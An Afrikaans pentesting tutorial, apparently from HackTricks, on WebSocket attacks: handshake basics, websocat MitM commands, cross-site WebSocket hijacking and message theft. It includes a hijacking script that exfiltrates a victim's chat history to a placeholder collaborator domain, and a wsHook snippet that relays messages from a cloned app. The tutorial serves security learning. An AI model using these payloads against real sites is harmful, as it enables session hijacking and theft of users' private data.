# WebSocket-aanvalle

{{#include ../banners/hacktricks-training.md}}

## Wat is WebSockets

WebSocket-verbindinge word gevestig deur 'n aanvanklike **HTTP** handdruk en is ontwerp om **langdurig** te wees, wat bidireksionele boodskappe op enige tyd moontlik maak sonder die behoefte aan 'n transaksionele stelsel. Dit maak WebSockets veral voordelig vir toepassings wat **lae latensie of bediener-geïnisieerde kommunikasie** vereis, soos lewendige finansiële datastrome.

### Vestiging van WebSocket-verbindinge

'n Gedetailleerde verduideliking oor die vestiging van WebSocket-verbindinge kan [**hier**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc) verkry word. In samevatting, WebSocket-verbindinge word gewoonlik geïnisieer via kliënt-kant JavaScript soos hieronder getoon:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws")
```
Die `wss` protokol dui 'n WebSocket-verbinding aan wat met **TLS** beveilig is, terwyl `ws` 'n **onbeveiligde** verbinding aandui.

Tydens die verbindingseestelling word 'n handdruk tussen die blaaiers en die bediener oor HTTP uitgevoer. Die handdrukproses behels dat die blaaiers 'n versoek stuur en die bediener antwoordgee, soos in die volgende voorbeelde geïllustreer:

Blaaier stuur 'n handdrukversoek:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Die bediener se handdrukrespons:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
Die verbinding bly oop vir boodskapswisseling in beide rigtings sodra dit gevestig is.

**Belangrike Punten van die WebSocket Handshake:**

- Die `Connection` en `Upgrade` headers dui die begin van 'n WebSocket handshake aan.
- Die `Sec-WebSocket-Version` header dui die verlangde WebSocket protokolweergawe aan, gewoonlik `13`.
- 'n Base64-gecodeerde ewekansige waarde word in die `Sec-WebSocket-Key` header gestuur, wat verseker dat elke handshake uniek is, wat help om probleme met kasproxies te voorkom. Hierdie waarde is nie vir outentisering nie, maar om te bevestig dat die antwoord nie deur 'n verkeerd geconfigureerde bediener of kas gegenereer is nie.
- Die `Sec-WebSocket-Accept` header in die bediener se antwoord is 'n hash van die `Sec-WebSocket-Key`, wat die bediener se bedoeling om 'n WebSocket-verbinding te open, verifieer.

Hierdie kenmerke verseker dat die handshake-proses veilig en betroubaar is, wat die pad baan vir doeltreffende regte-tyd kommunikasie.

### Linux-konsol

Jy kan `websocat` gebruik om 'n rou verbinding met 'n websocket te vestig.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Of om 'n websocat-bediener te skep:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket verbindings

As jy vind dat kliënte aan 'n **HTTP websocket** van jou huidige plaaslike netwerk gekoppel is, kan jy 'n [ARP Spoofing Attack ](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing)probeer om 'n MitM-aanval tussen die kliënt en die bediener uit te voer.\
Sodra die kliënt probeer om te verbind, kan jy dan gebruik maak van:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets opsporing

Jy kan die **tool** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **gebruik om bekend** **kwesbaarhede** in websockets outomaties te ontdek, te vingerafdruk en te soek.

### Websocket Ontfouting gereedskap

- **Burp Suite** ondersteun MitM websockets kommunikasie op 'n baie soortgelyke manier as wat dit vir gewone HTTP kommunikasie doen.
- Die [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite uitbreiding** sal jou toelaat om beter Websocket kommunikasies in Burp te bestuur deur die **geskiedenis** te verkry, **afluisterreëls** in te stel, **ooreenkoms en vervang** reëls te gebruik, **Intruder** en **AutoRepeater** te gebruik.
- [**WSSiP**](https://github.com/nccgroup/wssip)**:** Kort vir "**WebSocket/Socket.io Proxy**", hierdie tool, geskryf in Node.js, bied 'n gebruikerskoppelvlak om **te vang, af te luister, pasgemaakte** boodskappe te stuur en al WebSocket en Socket.IO kommunikasies tussen die kliënt en bediener te sien.
- [**wsrepl**](https://github.com/doyensec/wsrepl) is 'n **interaktiewe websocket REPL** wat spesifiek ontwerp is vir penetrasietoetsing. Dit bied 'n koppelvlak om **inkomende websocket boodskappe te observeer en nuwe te stuur**, met 'n maklik-om-te-gebruik raamwerk vir **outomatisering** van hierdie kommunikasie.&#x20;
- [**https://websocketking.com/**](https://websocketking.com/) dit is 'n **web om te kommunikeer** met ander webs deur middel van **websockets**.
- [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) onder andere tipes kommunikasies/protokolle, bied dit 'n **web om te kommunikeer** met ander webs deur middel van **websockets.**

## Websocket Laboratorium

In [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) het jy 'n kode om 'n web te begin met websockets en in [**hierdie pos**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) kan jy 'n verduideliking vind.

## Cross-site WebSocket kaping (CSWSH)

**Cross-site WebSocket kaping**, ook bekend as **cross-origin WebSocket kaping**, word geïdentifiseer as 'n spesifieke geval van **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)** wat WebSocket handdrukke beïnvloed. Hierdie kwesbaarheid ontstaan wanneer WebSocket handdrukke slegs via **HTTP koekies** outentiseer sonder **CSRF tokens** of soortgelyke sekuriteitsmaatreëls.

Aanvallers kan dit benut deur 'n **kwaadaardige webblad** te huisves wat 'n cross-site WebSocket verbinding met 'n kwesbare toepassing inisieer. Gevolglik word hierdie verbinding as deel van die slagoffer se sessie met die toepassing behandel, wat die gebrek aan CSRF beskerming in die sessie hanteringsmeganisme benut.

### Eenvoudige Aanval

Let daarop dat wanneer 'n **websocket** verbinding **gestig** word, die **koekie** na die bediener **gestuur** word. Die **bediener** mag dit gebruik om elke **spesifieke** **gebruiker** met sy **websocket** **sessie gebaseer op die gestuurde koekie** te **verbind**.

Dan, as die **websocket** **bediener** **die geskiedenis van die gesprek** van 'n gebruiker terugstuur as 'n boodskap met "**READY"** gestuur word, dan sal 'n **eenvoudige XSS** wat die verbinding tot stand bring (die **koekie** sal **automaties** gestuur word om die slagoffer gebruiker te magtig) **stuur** "**READY**" in staat wees om die geskiedenis van die **gesprek** te **herwin**.
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie met 'n ander subdomein

In hierdie blogpos [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) het die aanvaller daarin geslaag om **arbitraire Javascript in 'n subdomein** van die domein waar die web socket kommunikasie plaasgevind het, te **voer**. Omdat dit 'n **subdomein** was, is die **cookie** **gestuur**, en omdat die **Websocket nie die Origin behoorlik nagegaan het** nie, was dit moontlik om met dit te kommunikeer en **tokens van dit te steel**.

### Data van gebruiker steel

Kopieer die webtoepassing wat jy wil naboots (die .html lêers byvoorbeeld) en voeg hierdie kode by die skrip waar die websocket kommunikasie plaasvind:
```javascript
//This is the script tag to load the websocket hooker
;<script src="wsHook.js"></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function (data, url) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "client_msg?m=" + data, true)
xhttp.send()
}
wsHook.after = function (messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "server_msg?m=" + messageEvent.data, true)
xhttp.send()
return messageEvent
}
```
Nou laai die `wsHook.js` lêer af van [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) en **stoor dit binne die gids met die web lêers**.\
Deur die webtoepassing bloot te stel en 'n gebruiker te laat aansluit, sal jy in staat wees om die gestuurde en ontvangde boodskappe via websocket te steel:
```javascript
sudo python3 -m http.server 80
```
## Wedrenstoestande

Wedrenstoestande in WebSockets is ook 'n ding, [check this information to learn more](race-condition.md#rc-in-websockets).

## Ander kwesbaarhede

Aangesien Web Sockets 'n mekanisme is om **data na die bediener- en kliëntkant te stuur**, afhangende van hoe die bediener en kliënt die inligting hanteer, **kan Web Sockets gebruik word om verskeie ander kwesbaarhede soos XSS, SQLi of enige ander algemene web kwesbaarheid te benut deur die invoer van 'n gebruiker vanaf 'n websocket.**

## **WebSocket Smuggling**

Hierdie kwesbaarheid kan jou toelaat om **omgekeerde proxybeperkings te omseil** deur hulle te laat glo dat 'n **websocket kommunikasie gevestig is** (selfs al is dit nie waar nie). Dit kan 'n aanvaller toelaat om **verborgene eindpunte te benader**. Vir meer inligting, kyk na die volgende bladsy:

{{#ref}}
h2c-smuggling.md
{{#endref}}

## Verwysings

- [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)

{{#include ../banners/hacktricks-training.md}}
